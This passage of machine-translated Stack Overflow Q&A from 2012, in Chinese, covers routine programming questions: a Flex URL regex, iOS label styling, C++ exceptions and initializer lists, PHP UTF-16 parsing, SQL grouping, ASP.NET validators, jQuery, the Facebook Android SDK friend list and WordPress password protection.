实际的问题是，当将 RegExp 作为 String 传递给 a`RegExpValidator`时，它必须进行**双重转义**。因此，如果从资源文件中加载 Pattern，它应该如下所示：

```
general.urlRegExp=^(?:(?:https?|ftp):\\/\\/)(?:\\S+(?::\\S*)?@)?(?:(?!10(?:\\.\\d{1,3}){3})(?!127(?:\\.\\d{1,3}){3})(?!169\\.254(?:\\.\\d{1,3}){2})(?!192\\.168(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z\\x{00a1}-\\x{ffff}0-9]+-?)*[a-z\\x{00a1}-\\x{ffff}0-9]+)(?:\\.(?:[a-z\\x{00a1}-\\x{ffff}0-9]+-?)*[a-z\\x{00a1}-\\x{ffff}0-9]+)*(?:\\.(?:[a-z\\x{00a1}-\\x{ffff}]{2,})))(?::\\d{2,5})?(?:\\/[^\\s]*)?$ 
```

现在这可以直接在`RegExpValidator`：

```
<mx:RegExpValidator expression="{resourceManager.getString('resources','general.urlRegExp')}" flags="gmi" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T18:36:04.077

您可以使用 mx.utils.URLUtil 类：

```
trace(URLUtil.isHttpURL( 'http://www.ftd.de/rss2')); //true 
```

它也有助于提取 url 的不同部分。

# javascript - 将鼠标悬停与图像映射相结合

> ID：13957152
> 
> 赞同：0
> 
> 时间：2012-12-19T16:49:44.477
> 
> 标签：javascript, html, css, mouseover, imagemap

我正在尝试创建一个悬停鼠标悬停效果，其中 onMouseOver 项目是具有三个单独链接的单个图像。

我正在使用标准的 onMouseOver、onMouseOut 效果并尝试将其与[像这样](http://www.onextrapixel.com/2009/04/30/how-to-create-multiple-links-on-a-single-image-with-image-map/)的图像映射结合起来。

我能得到的最接近的是鼠标悬停效果，其中链接仅在图像位于 onMouseOut 时显示，而在 onMouseOver 时不显示链接。简而言之，有没有办法将这两种效果结合起来，以便在 onMouseOver 图像上显示图像映射链接，从而使两种效果协同工作？

[这是一个示例](http://www.getwinston.com/new.html)，显示了我正在尝试解决的问题。要完全了解问题的要点，请尝试将鼠标从上到下缓慢地悬停在图像上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T16:55:39.380

执行此类操作的最佳方法是使用 CSS 和 :hover 选择器。

```
image {
   background-image:url('image1.png');
}

image:hover {
   background-image:url('image2.png');
} 
```

Of course, you'll need more styles here and appropriately selected elements to make this work the way you'd like.

# ios - 字体和 textColor 消失了 - 又一个 UITableViewCell awakeFromNib

> ID：13957156
> 
> 赞同：4
> 
> 时间：2012-12-19T16:49:51.610
> 
> 标签：ios, uitableview, xib, awakefromnib

我不知道这是否是特定的，`UITableViewCells`而是一般的`UIViews` （我相信），但我注意到了一个单元格的*问题*。

如前所述，我有一个自定义`UITableViewCell`子类，它在使用指定的 init 初始化时从 xib 加载自身：

```
- (id)initWithReuseIdentifier:(NSString *)reuseIdentifier
{
    NSArray *nib = [[NSBundle mainBundle] loadNibNamed:@"MyCell" owner:nil options:nil];
    self = nib[0];
    if (self) {
        // Initialization code
        _reuseIdentifier = reuseIdentifier;
    }
    return self;
} 
```

它有一个`UILabel`作为出口，我在`awakeFromNib`方法中设置了它的一些属性：

```
- (void)awakeFromNib{
    [super awakeFromNib];

    self.labelLeft.textColor = [UIColor grayColor];
    self.labelLeft.font = [UIFont boldSystemFontOfSize:15.0f];
} 
```

关键是，标签**既不保留**textColor 也不保留字体，我不明白为什么。
`awakeFromNib`被调用并且插座连接正确，因为我可以设置文本。

在我设置他的文本后，我可以通过设置这些属性使其工作，`UITableViewDataSource`但我不觉得这是正确的方式，我想了解为什么这不起作用。

**问题**：
为什么它不保留字体和文本颜色，我该怎么做才能让它以正确的方式工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-13T16:00:17.733

我从`.Nib`'s 加载的所有标签都有同样的问题。然后我发现问题出在`UIAppearance`. 我在我的以下行`AppDelegate`：

```
+ (void)styleApplication {
    [[UILabel appearance] setFont:[MGStylesheet defaultLightFontOfSize:17]];
} 
```

此方法更新我的应用程序中的所有字体，并且一切正常，直到我开始`UIView`从`.Nib`. 当我删除它时，一切都开始按预期工作。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-05T18:24:54.713

在 nib 文件中设置标签的属性。如果您将接口配置拆分到不同的地方，这只会导致崩溃。

如果您不想这样做，请将标签的配置移动到`viewDidLoad:`

# c++ - C++ 异常 - 每个库一个或自定义一个

> ID：13957162
> 
> 赞同：1
> 
> 时间：2012-12-19T16:50:08.327
> 
> 标签：c++, exception

我试图弄清楚什么是正确的方法来做到这一点。假设您正在制作一个名为 Foo 的新 C++ 库。您是否应该对库中的所有错误（FooException）只有一个异常，或者人们实际上是否有自定义异常：FooLoginFailedException、FooServerDownException、FooSomethingException...

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T19:25:50.307

对于特定的失败，您应该有特定的异常，但它们都应该从您的库的单一基本异常类型派生。这样，您库的用户可以选择是否对特定类型的故障进行专门处理，或者只是对您库中的所有故障进行相同的处理。例如：

```
class FooException : public std::exception { ... }
class FooLoginFailedException : public FooException { ... }
// ... etc ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:32:42.087

这取决于异常应该传达什么信息，以及期望用户管理多少细节。

# c++ - 移动初始化列表的元素是否安全？

> ID：13957166
> 
> 赞同：6
> 
> 时间：2012-12-19T16:50:25.093
> 
> 标签：c++, c++11, containers, move-semantics, initializer-list

> **可能重复：**
> [initializer_list 和移动语义](https://stackoverflow.com/questions/8193102/initializer-list-and-move-semantics)

在这段代码中：

```
#include <vector>
#include <initializer_list>

template<typename T>
class some_custom_container : public std::vector<T>
{
public:
   some_custom_container(const std::initializer_list<T>& contents)
   {
      for (auto& i : contents)
        this->emplace_back(std::move(i));
   }
};

class test_class
{};

int main()
{
    test_class a;

    some_custom_container<test_class> i = { a, test_class(), a };
} 
```

如果我理解的话，其中的所有对象`{ a, test_class(), a }`都是安全构造的：命名对象被复制，未命名对象被移动以构造 initializer_list。之后， this`initializer_list`通过引用传递给`some_custom_container`的构造函数。

然后，为了避免无用的双副本，我将它们全部移动以填充向量。

这个构造函数安全吗？我的意思是，在一种奇怪的情况下，例如，如果 T 被评估为参考 & 或 &&，那么向量是否总是被充分填充（包含安全对象）？

如果是这样，为什么`initializer_list`stl容器的构造函数实现不是这样实现的？据我所知，他们的构造函数复制并且不移动内容。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:26:29.373

`initializer_list`只提供`const`对其元素的访问。您可以使用`const_cast`来编译该代码，但是这些移动最终可能会导致未定义的行为（如果 的元素`initializer_list`是真正的 const ）。所以，不，这样做是不安全的。如果您确实需要它，则有[解决方法。](https://stackoverflow.com/a/8469002/46642)

# c++ - 构造函数中的 fp 赋值崩溃 [C++]

> ID：13957168
> 
> 赞同：0
> 
> 时间：2012-12-19T16:50:30.603
> 
> 标签：c++, crash

我在客户的计算机上发生了非常奇怪的“崩溃”。使用日志，我能够将其跟踪到这行代码：

我的变量 = 1; //这'崩溃'。myvar 被声明为“双”

代码显然没问题。但是 myvar 是一个类的成员变量。这个变量有一个全局实例，代码行在构造函数中。所以它在main()之前执行。风格不好，我知道...

我的问题： - 是否允许在 main() 之前使用 float/double？- 我可以调用某种“InitFloatSystem()”函数吗？

更多信息： - 它是 Win32 / C++ - 没有崩溃消息，程序只是关闭 - try/catch 没有帮助

我真的没主意了...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-10T09:12:36.400

终于，终于找到了问题所在。这是 Visual Studio 2012 的问题。我在 Microsoft 网站上发现，尽管他们报告了不同的副作用：[http ://connect.microsoft.com/VisualStudio/feedback/details/771122/floating-point-math-change-from -vs2008-to-vs2012-affects-native-code-but-not-managed-code](http://connect.microsoft.com/VisualStudio/feedback/details/771122/floating-point-math-change-from-vs2008-to-vs2012-affects-native-code-but-not-managed-code)

我的猜测是编译器现在默认使用某些旧处理器上不可用的处理器功能。使用这个编译器选项神奇地修复了它：/arch:IA32

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T19:09:35.333

除非您的二进制文件已损坏，否则简单的赋值不会导致崩溃 - 除非您重载了赋值运算符？

很可能是您损坏了堆，或者在某些地方调用了未定义的行为，并且您所追踪的只是这种情况的副作用。

应用程序验证器在 Windows 上非常方便，可以帮助追踪这些事情：

[http://msdn.microsoft.com/en-us/library/ms220948(v=vs.90).aspx](http://msdn.microsoft.com/en-us/library/ms220948(v=vs.90).aspx)

但是.. 追查这些错误的真正原因绝非易事，最高警告级别，错误警告和静态代码检查器有助于避免大多数这些问题。

# php - 在 PHP 中，如何将 unicode 数字字符串正确转换为数字？

> ID：13957169
> 
> 赞同：1
> 
> 时间：2012-12-19T16:50:31.530
> 
> 标签：php, string, csv, unicode, ansi

我有 csv 文件以 unicode 编码，当我使用 fgetcsv 或 fgets 读取它并尝试在 PHP 中将数字字符串用作整数时，只有字符串的第一个字符被转换为数字，即

```
$str='2012';
$num=$str + 0; OR $num=(int)$str;
echo $num;
results -> 2 
```

如何正确转换这些 un​​icode 数字字符串？

我在 PHP 中使用从 unicode 到其他字符集的转换函数没有成功！

我知道的唯一方法是使用简单的文本编辑器，如记事本或记事本++，并将文件格式转换为 ANSI csv。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:18:32.040

将其转换为其他编码，例如 UTF-8。

```
$str = mb_convert_encoding( $str, "UTF-8", "UTF-16LE"); 
```

您的字符串实际上是这样的（手动构造的 UTF-16LE）：

```
 $str = "2\x000\x001\x002\x00"; 
```

所以 php 读取第一个`2`，然后查看`NUL`哪个不是数字，然后你得到`2`.

顺便说一句，这里不处理 LE BOM ( `\xFF\xFE`)，所以请展示您的完整代码，我会看到的。

# sql - 将 datepart() 与 group by 命令一起使用

> ID：13957170
> 
> 赞同：6
> 
> 时间：2012-12-19T16:50:35.203
> 
> 标签：sql, sql-server, sql-server-2008

我正在用我的头来对抗一些东西，我敢肯定，非常明显 -

我有一些 SQL 代码，旨在汇总我商店中每张发票的总售价，然后按月份进行组织。

```
select SUM(totalsellingprice) from dbo.tblServiceOrders
where datepart(MONTH,dbo.tblServiceOrders.datereceived) =12 
```

据我了解，这应该返回从第 12 个月（12 月）开始的所有总售价的总和。目前，此查询返回

```
135998.92 
```

但是，如果我然后尝试将其放入一个组中，让它在所有月份都吐出来，那么这个数字就会改变。

```
select SUM(totalsellingprice) from dbo.tblServiceOrders
group by datepart(MONTH,dbo.tblServiceOrders.datereceived) 
```

我得到这张桌子 -

```
 1 - 110567.70
 2 - 60059.59
 3 - 135998.92
 4 - 63089.22
 5 - 102287.01
 6 - 71088.68
 7 - 149102.10
 8 - 67722.65
 9 - 67122.45
10 - 64234.82
11 - 7542.05
12 - 130461.10 
```

有 12 行，这对我来说听起来不错（一年 12 个月），但最后一行是 130461。

第二次搜索中的第 12 行怎么可能不等于我在第一次搜索中所做的？我觉得我错过了一些明显的东西，但我一生都无法弄清楚是什么。

任何和所有的帮助将不胜感激！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-19T17:04:39.493

我知道了：

您的查询非常混乱，因为它不包括 MONTH 列：

如果您这样做了，您就会意识到您的查询不是按 MONTH 排序的，因此 MONTH 12 作为查询的第 3 行返回。

;)

```
select SUM(totalsellingprice) from dbo.tblServiceOrders
group by datepart(MONTH,dbo.tblServiceOrders.datereceived)
order by datepart(MONTH,dbo.tblServiceOrders.datereceived) 
```

请不要参考行索引来选择哪个月份与哪个总和有关。并且区分年份应该是一个好主意（如果需要）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T16:56:18.360

运行它，看看它做了什么......

```
 select dateadd(month, datediff(month, 0, datereceived),  0),
      Sum(totalsellingprice) 
 from dbo.tblServiceOrders
 group by dateadd(month, datediff(month, 0, datereceived),  0) 
```

# c# - 一次只触发一个自定义验证器

> ID：13957174
> 
> 赞同：3
> 
> 时间：2012-12-19T16:50:44.000
> 
> 标签：c#, asp.net

我有两个`Custom Validators`附加到一个文本框。文本框用于输入逗号分隔的电子邮件列表。第一个验证器检查没有重复的电子邮件地址。第二个自定义验证器检查所有电子邮件地址的格式是否有效。我有以下代码，它工作正常。

但是，当两个失败标准都满足时，它们都会触发，我`*`在文本框的右侧得到两个。一次只显示一个的最佳方法是什么`*`？

![在此处输入图像描述](../Images/be9d5790c54354aa783a08d64d3eebe8.png)

**代码**

```
<asp:CustomValidator ID="valEmailRecipients" runat="server" ControlToValidate="txtEmailRecipients"
ClientValidationFunction="isUniqueElements" OnServerValidate="IsUniqueEmail_Validate"
Text="*" ErrorMessage="There should be no duplicate email address for a report"
ValidationGroup="Save">
</asp:CustomValidator>

<asp:CustomValidator ID="valEmailFormat" runat="server" ControlToValidate="txtEmailRecipients"
ClientValidationFunction="checkEmailFormat" OnServerValidate="IsValidEmailFormat_Validate"
Text="*" ErrorMessage="Entries should be valid email addresses separated by comma"
ValidationGroup="Save">
</asp:CustomValidator> 
```

**参考文献**：

1.  [使用 ASP.NET 服务器控件的自定义函数进行验证](http://msdn.microsoft.com/en-us/library/f5db6z8k(VS.71).aspx)
2.  [在 javascript 中启用/禁用 asp 验证控件](https://stackoverflow.com/questions/8444504/enable-disable-asp-validation-control-in-javascript)
3.  [如何为验证器设置 ValidatorEnable() javascript 属性？](https://stackoverflow.com/questions/9871774/how-to-set-validatorenable-javascript-attribute-for-a-validator)
4.  [使用 Javascript 启用验证器](https://stackoverflow.com/questions/6062020/validator-enable-using-javascript)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:02:08.520

`true`最简单的方法：-如果电子邮件格式不正确，让 valEmailRecipients 返回。也就是说，只有当其他验证成功时，它才会发挥作用。

其他方式：- `Disabling`和`Enabling`验证器，这可能很痛苦。

只是出于好奇，为什么有 2 个星号有问题？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:40:25.823

创建一个自定义验证器，并在其上执行所有验证逻辑。

如果一项验证未通过，则为其设置相应的错误消息，将 args.IsValid 设置为 false 并结束该方法。

在提交按钮上，记得检查 Page.IsValid。

# javascript - 如何仅在 IE 中强制打开新窗口

> ID：13957176
> 
> 赞同：0
> 
> 时间：2012-12-19T16:50:45.690
> 
> 标签：javascript, jquery, asp.net

我正在asp.net 中创建一个Web 应用程序。在那我曾经`window.Open`在另一个窗口中打开新页面。我想要的是当这个窗口被触发时，它应该只在 IE 中打开。即使用户在 crome、firefox 或任何其他浏览器中使用它

```
window.open("http://www.google.com") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T16:56:23.847

这是不可能的。

浏览器不允许网页在用户的系统上启动任意应用程序（并且也没有特定的“启动 IE”功能……未来也不太可能有 - 浏览器供应商并没有让作者将他们的用户转移到竞争对手！）。

即使有，也不是所有系统都有 Internet Explorer 可用。

设计一个 Web 应用程序而不是 Internet Explorer 应用程序。

# c++ - 是否可以通过跨二进制边界传递的对象上的接口调用虚函数？

> ID：13957178
> 
> 赞同：1
> 
> 时间：2012-12-19T16:50:52.213
> 
> 标签：c++, dll, shared-libraries

给定这个接口：

```
struct ISomething
{
    virtual void __stdcall DoSomething() = 0;
}; 
```

`DoSomething`即使编译设置不同，应用程序能否安全地调用从 dll 或共享对象返回的具体对象？

（假设在非 Visual Studio 编译器上 d 为空。`__stdcall`）`#define`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:30:51.197

实际上，当您说“对象”时，您指的是*指向*相关对象的指针吗？我假设是这样，因为由于纯虚拟 decls，您很可能无法创建 ISomething。

所以，如果你的意思是：

```
ISomething* pObj = SomeAPICallToGetAnObject();
pObj->DoSomething(); 
```

那么只要调用者和实现者都同意调用约定、打包结构化参数（如果有的话）等，它就会起作用。所述约定是基于声明的，并且由实现者+调用者按照合同强制执行。如果您未能将其定义为声明性合同的一部分，就会发生令人讨厌的事情。

这样的事情在实践中很常见吗？绝对地。我经常使用的所有 WIN32 api 代码的整个 COM 端肯定*不会*使用我经常使用的相同的各种编译设置进行编译。但是我从标头 decls 获得的合同确保我使用正确的约定来使其工作。事实上，这些声明确保我的编译*符合*使调用成功的要求。

我*希望*我没有误解你的问题。

# javascript - 使用 jQuery 动态更改对象参数

> ID：13957179
> 
> 赞同：1
> 
> 时间：2012-12-19T16:50:52.373
> 
> 标签：javascript, jquery

我有以下 HTML（为了这个问题而简化和剥离）：

```
<html>
    <head>
        <title>My page</title>
    </head>
    <body>
        <object id="myExp" class="myClass">
            <param name="bgcolor" value="#ffffff" />
            <param name="wmode" value="transparent" />
            <param name="width" value="560" />
            <param name="height" value="310" />
            <param name="id" value="1535" />
        </object>

        <script type="text/javascript">
            function changeId(id)
            {
                // $('#myExp').
            }
        </script>
    </body>
</html> 
```

我想做的是使`changeId()`功能正常工作。它应该做的是用传递给函数`<param name="id" value="1535" />`的任何内容替换我上面的行。`id`如何使用 jQuery（或普通的旧 javascript，如果需要）来动态更改`id`/`object`值`param`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T16:55:59.833

```
function changeId(id) {
   $("#myExp param[name=id]").attr('value', id);
}

changeId(6); 
```

记住也要实际*调用*该函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T16:55:52.500

除非我遗漏了一些明显的东西，否则这就是您在 jQuery 中寻找的内容：

```
$("#myExp [name='id']").val(id); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T16:56:07.513

这似乎有效：

```
function changeId(id) {
    $('#myExp [name=id]').val(id);
} 
```

# android - 获取好友列表 facebook 3.0

> ID：13957181
> 
> 赞同：27
> 
> 时间：2012-12-19T16:50:55.023
> 
> 标签：android, facebook, facebook-graph-api, facebook-android-sdk

我正在尝试使用新的 SDK（3.0）从 facebook 获取我的朋友列表。我面临与需要在 Bundle 中插入哪种参数以及如何使用 newMyFriendRequest 和 GraphAPI 相关的问题。

我没有在 facebook 文档上找到关于我们必须使用哪种字段的地方。基于[GraphExplorer](http://developers.facebook.com/tools/explorer)，我在我的 Bundle 中插入键“fields”，并将此字符串“id,name,friend”作为值。下面的代码显示了我现在正在做的事情。在我得到我的照片和名字后，我执行 newMyFriendRequest。我相信它默认使用 GraphAPI。

我在 StackOverflow 上看到了一些相关的帖子：

[如何使用新的 Android SDK 发送 FQL 查询](https://stackoverflow.com/questions/13145284/how-to-send-a-fql-query-with-the-new-android-sdk)

[Facebook Android SDK 请求参数：在哪里可以找到文档？](https://stackoverflow.com/questions/8933104/facebook-android-sdk-request-parameters-where-find-documentation)

它对我帮助不大，我不想使用 FQL。对于响应 II，我收到了这个 JSON，就像一个答案：

```
{Response:  responseCode: 500, graphObject: null, error: {HttpStatus: 500, errorCode: 100, errorType: FacebookApiException, errorMessage: Unsupported operation}, isFromCache:false} 
```

请注意，我是 Facebook SDK for Android 的新手。

```
private void onSessionStateChange(final Session session, SessionState sessionState, Exception ex){
    if(session != null && session.isOpened()){
        getUserData(session);
    }
}

private void getUserData(final Session session){
    Request request = Request.newMeRequest(session, 
        new Request.GraphUserCallback() {
        @Override
        public void onCompleted(GraphUser user, Response response) {
            if(user != null && session == Session.getActiveSession()){
                pictureView.setProfileId(user.getId());
                userName.setText(user.getName());
                getFriends();

            }
            if(response.getError() !=null){

            }
        }
    });
    request.executeAsync();
}

private void getFriends(){
    Session activeSession = Session.getActiveSession();
    if(activeSession.getState().isOpened()){
        Request friendRequest = Request.newMyFriendsRequest(activeSession, 
            new GraphUserListCallback(){
                @Override
                public void onCompleted(List<GraphUser> users,
                        Response response) {
                    Log.i("INFO", response.toString());

                }
        });
        Bundle params = new Bundle();
        params.putString("fields", "id,name,friends");
        friendRequest.setParameters(params);
        friendRequest.executeAsync();
    }
} 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-12-24T01:25:04.677

在 getFriends() 方法中，更改此行：

```
params.putString("fields", "id,name,friends"); 
```

经过

```
params.putString("fields", "id, name, picture"); 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-04T07:00:44.993

**使用 FQL 查询**

```
String fqlQuery = "SELECT uid,name,pic_square FROM user WHERE uid IN " +
        "(SELECT uid2 FROM friend WHERE uid1 = me())";

Bundle params = new Bundle();
params.putString("q", fqlQuery);
Session session = Session.getActiveSession();

Request request = new Request(session,
        "/fql",                         
        params,                         
        HttpMethod.GET,                 
        new Request.Callback(){       
    public void onCompleted(Response response) {
        Log.i(TAG, "Result: " + response.toString());

        try{
            GraphObject graphObject = response.getGraphObject();
            JSONObject jsonObject = graphObject.getInnerJSONObject();
            Log.d("data", jsonObject.toString(0));

            JSONArray array = jsonObject.getJSONArray("data");
            for(int i=0;i<array.length();i++){

                JSONObject friend = array.getJSONObject(i);

                Log.d("uid",friend.getString("uid"));
                Log.d("name", friend.getString("name"));
                Log.d("pic_square",friend.getString("pic_square"));             
            }
        }catch(JSONException e){
            e.printStackTrace();
        }
    }                  
}); 
Request.executeBatchAsync(request); 
```

**参考**：[运行 FQL 查询](http://developers.facebook.com/docs/howtos/androidsdk/3.0/run-fql-queries/)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-08-08T12:22:29.443

这应该有效：

```
// @Deprecated
// Request.executeMyFriendsRequestAsync()

// Use this instead:
Request.newMyFriendsRequest(session, new GraphUserListCallback() {

    @Override
    public void onCompleted(List<GraphUser> users, Response response) 
    {
        if(response.getError() == null)
        {
            for (int i = 0; i < users.size(); i++) {
                Log.e("users", "users " + users.get(i).getName());
            }
        }
        else
        {
            Toast.makeText(MainActivity.this, 
                           response.getError().getErrorMessage(), 
                           Toast.LENGTH_SHORT).show();
        }
    }
}); 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-07-24T06:02:19.397

不幸的是，Facebook 删除了这些权限。

/me/friends 返回用户的也在使用您的应用程序的朋友。

在 v2.0 中，好友 API 端点返回一个人的好友列表，这些好友也在使用您的应用程序。在 v1.0 中，响应包括一个人的所有朋友。

在 v1.0 中，可以请求允许应用程序查看有限数量的朋友数据的权限，例如一个人的朋友的喜欢、他们的生日等。

在 v2.0 中，这些权限已全部删除。除非这些朋友也登录到应用程序并授予应用程序查看该数据的权限，否则应用程序将无法再查看某人的朋友的数据

[https://developers.facebook.com/docs/apps/upgrading#v2_0_friendlist_title](https://developers.facebook.com/docs/apps/upgrading#v2_0_friendlist_title)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-07-16T05:57:21.170

您可以使用我的代码，您需要在项目中使用 facebook 库。用于 facebook 的所有类都在那个 sdk 中。

```
private void onSessionStateChange(Session session, SessionState state,
        Exception exception) {
    if (state.isOpened()) {
        Log.i(TAG, "Logged in...");
        Request.executeMyFriendsRequestAsync(session,
                new GraphUserListCallback() {

                    @Override
                    public void onCompleted(List<GraphUser> users,
                            Response response) {
                        Log.i("Response JSON", response.toString());
                        names = new String[users.size()];
                        id = new String[users.size()];
                        for (int i=0; i<users.size();i++){
                            names[i] = users.get(i).getName();
                            id[i]= users.get(i).getId();                                
                        }                           
                    }
                });
    } else if (state.isClosed()) {
        Log.i(TAG, "Logged out...");
    }
} 
```

names 和 ids 是两个字符串数组，现在包含朋友的所有名称和 id。我希望它能解决你的问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-06-12T15:57:01.543

对于问如何获得名字和姓氏的人，您需要输入 first_name 和 last_name 而不是 name。

```
params.putString("fields", "id, first_name, last_name, picture"); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-12-18T11:01:48.817

> 使用以下代码从 Facebook 获取好友列表。它将仅显示那些使用该应用程序完成 Facebook 登录的用户的数据，并且用户在数据库中有 Facebook id。然后这将显示这些朋友的列表。

**FacebookFriendListActivity.java**

```
package com.application.Activity;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import com.facebook.HttpMethod;
import com.facebook.Request;
import com.facebook.RequestBatch;
import com.facebook.Response;
import com.facebook.Session;
import com.facebook.SessionDefaultAudience;
import com.facebook.SessionLoginBehavior;
import com.facebook.SessionState;
import com.facebook.internal.SessionTracker;
import com.facebook.internal.Utility;
import com.facebook.model.GraphObject;
import com.facebook.model.GraphUser;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import Info.InfoUsers;
import india.application.upflair.Adapter.FindPeopleAdapter;
import india.application.upflair.R;
import utills.ConnectionDetector;
import utills.Constant;

public class FacebookFriendListActivity extends AppCompatActivity {

    //facebook section
    SessionTracker mSessionTracker;
    Session mCurrentSession = null;

    String facebook_id;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.listview);

        signInWithFacebook();

    }

    /***
     * facebook section to get friend list
     */
    private void signInWithFacebook() {
        mSessionTracker = new SessionTracker(getBaseContext(), new Session.StatusCallback() {
            @Override
            public void call(Session session, SessionState state, Exception exception) {
                //TODO..
            }
        },
                null, false);

        String applicationId = Utility.getMetadataApplicationId(getBaseContext());
        mCurrentSession = mSessionTracker.getSession();
        mSessionTracker.setSession(null);
        Session session = new Session.Builder(getBaseContext()).setApplicationId(applicationId).build();
        Session.setActiveSession(session);
        mCurrentSession = session;

        if (!mCurrentSession.isOpened()) {
            Session.OpenRequest openRequest = null;
            openRequest = new Session.OpenRequest(FacebookFriendListActivity.this);
            if (openRequest != null) {
                openRequest.setDefaultAudience(SessionDefaultAudience.FRIENDS);
                openRequest.setPermissions(Arrays.asList("user_birthday", "email", "user_location", "user_friends"));
                openRequest.setLoginBehavior(SessionLoginBehavior.SSO_WITH_FALLBACK);
                mCurrentSession.openForRead(openRequest);
                accessFacebookUserInfo();

            }
        } else {
            accessFacebookUserInfo();
        }
    }

    Request friendListRequest = null;
    private void accessFacebookUserInfo() {
        if (Session.getActiveSession() != null & Session.getActiveSession().isOpened()) {

            Request cover_request = new Request(Session.getActiveSession(), "me", null, HttpMethod.GET, new Request.Callback() {
                @Override
                public void onCompleted(Response response) {}
            });
            Request.executeBatchAsync(cover_request);

            Request meRequest = Request.newMeRequest(Session.getActiveSession(),new Request.GraphUserCallback() {
                @Override
                public void onCompleted(GraphUser user, Response response) {
                    try {

                        friendListRequest.executeAsync();

                    } catch (Exception jex) {
                        jex.printStackTrace();
                    }
                }
            });

            RequestBatch requestBatch = new RequestBatch(meRequest);

            requestBatch.addCallback(new RequestBatch.Callback() {
                @Override
                public void onBatchCompleted(RequestBatch batch) {}
            });
            requestBatch.executeAsync();

            friendListRequest = new Request(Session.getActiveSession(), "/me/friends", null, HttpMethod.GET, new Request.Callback() {
                @Override
                public void onCompleted(Response response) {
                    try {
                        GraphObject graphObj = response.getGraphObject();
                        if (graphObj != null) {

                            JSONObject jsonObj = graphObj.getInnerJSONObject();
                            JSONArray data=jsonObj.getJSONArray("data");

                            if(data.length()>0 && data!=null)
                            {
                                for(int i=0;i<data.length();i++)
                                {
                                    JSONObject dataobj= data.getJSONObject(i);

                                    String name=dataobj.getString("name");
                                    String id=dataobj.getString("id");

                                    System.out.println("name==============" + name);
                                    System.out.println("id==============" + id);

                                    facebooklist.add(id);

                                    facebook_id = facebooklist.toString().replace("[", "");
                                    facebook_id = facebook_id.replace("]", "");

                                }

                            }

                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == RESULT_OK) {
            Session.getActiveSession().onActivityResult(this, requestCode, resultCode, data);
            if (mCurrentSession.isOpened()) {

                accessFacebookUserInfo();
            }
            else {
                Toast.makeText(mContext, "some thing went wrong plz try later", Toast.LENGTH_LONG).show();
            }
        } else {
            Toast.makeText(mContext, "some thing went wrong plz try later", Toast.LENGTH_LONG).show();
            mCurrentSession = null;
            mSessionTracker.setSession(null);
        }
    }

} 
```

# wordpress - 密码保护不适用于自定义帖子类型 single-template.php？- WordPress

> ID：13957184
> 
> 赞同：2
> 
> 时间：2012-12-19T16:51:06.710
> 
> 标签：wordpress, templates, taxonomy, custom-post-type

我创建了一个自定义帖子类型“客户”，管理员用户可以在其中创建新客户，添加图片和详细信息以发布，然后密码保护页面，以便只有特定客户才能访问内容。

为了在前端显示这种帖子类型的内容，我使用了一个 single-clients.php 模板。它完美地显示内容，但密码保护功能不会显示表单并隐藏内容，即使我在不​​同的浏览器中，缓存也会被清除/退出 Wordpress（以普通最终用户的方式查看）。

我在这里可能做错了什么？

```
<?php get_header(); ?>

  <div class="container-client">

    <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>

      Display all fields and content for post-type

    <?php endif; ?>

    <?php endwhile; else: ?>

    <div class="alert-box error">Sorry, this page no longer exists :( &mdash; <a href="<?php bloginfo('url'); ?>/">Back to home</a></div>

    <?php endif; ?>

  </div>

<?php get_footer(); ?> 
```

这大致就是我的 single-clients.php 页面的设置方式。有没有办法手动显示密码功能，以便最终用户访问页面时隐藏内容并显示密码表单？

* * *

## 回答 #1

> 赞同：1
> 
